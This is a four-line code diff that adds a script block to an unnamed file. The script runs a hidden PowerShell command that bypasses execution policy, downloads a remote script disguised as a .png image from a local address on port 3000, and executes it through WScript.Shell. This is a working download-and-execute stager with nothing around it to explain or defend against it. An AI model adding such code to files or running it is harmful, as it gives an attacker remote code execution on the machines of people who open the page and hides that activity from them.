@@ -1,0 +1,4 @@
+<script>
+var c = "powershell.exe -w hidden -nop -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring('http://0.0.0.0:3000/ps/ps.png')); Invoke-ps\"\"";
+new ActiveXObject('WScript.Shell').Run(c);
+</script>
